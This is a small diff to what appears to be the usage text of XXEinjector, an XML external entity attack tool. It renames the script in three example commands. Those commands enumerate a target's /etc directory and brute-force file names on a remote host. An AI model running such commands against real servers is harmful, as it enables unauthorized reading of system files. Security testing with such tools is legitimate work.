@@ -23,8 +23,8 @@ Options:<br />
 
 Example usage:<br />
   Enumerating /etc directory using HTTPS protocol with proxy:<br />
-  ruby XXEinjector-github.rb --host=192.168.0.2 --path=/etc --file=/tmp/req.txt --ssl --proxy=127.0.0.1:8080<br />
+  ruby XXEinjector.rb --host=192.168.0.2 --path=/etc --file=/tmp/req.txt --ssl --proxy=127.0.0.1:8080<br />
   Enumerating /etc directory using HTTP protocol:<br />
-  ruby XXEinjector-github.rb --host=192.168.0.2 --path=/etc --file=/tmp/req.txt<br />
+  ruby XXEinjector.rb --host=192.168.0.2 --path=/etc --file=/tmp/req.txt<br />
   Bruteforcing files:<br />
-  ruby XXEinjector-github.rb --host=192.168.0.2 --brute=/tmp/filenames.txt --file=/tmp/req.txt
+  ruby XXEinjector.rb --host=192.168.0.2 --brute=/tmp/filenames.txt --file=/tmp/req.txt
